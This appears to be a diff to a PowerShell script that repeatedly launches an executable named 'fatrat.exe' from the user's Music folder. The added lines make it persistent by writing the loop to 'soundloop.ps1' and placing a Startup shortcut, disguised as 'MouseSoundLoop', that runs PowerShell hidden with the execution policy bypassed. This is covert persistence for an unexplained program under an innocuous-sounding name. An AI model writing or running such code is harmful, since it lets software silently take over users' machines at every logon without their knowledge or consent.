@@ -32,3 +32,33 @@ while ($true) {
     Start-Process "$env:USERPROFILE\Music\fatrat.exe"
     Start-Sleep -Seconds 20
 }
+
+
+
+
+
+
+$exePath = "$env:USERPROFILE\Music\fatrat.exe"
+
+
+$loopScript = "$env:USERPROFILE\Music\soundloop.ps1"
+
+
+@"
+while ($true) {
+    Start-Process "$exePath"
+    Start-Sleep -Seconds 20
+}
+"@ | Set-Content -Path $loopScript -Encoding UTF8
+
+
+$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+
+
+$shortcut = Join-Path $startup "MouseSoundLoop.lnk"
+
+$wsh = New-Object -ComObject WScript.Shell
+$sc = $wsh.CreateShortcut($shortcut)
+$sc.TargetPath = "powershell.exe"
+$sc.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loopScript`""
+$sc.Save()
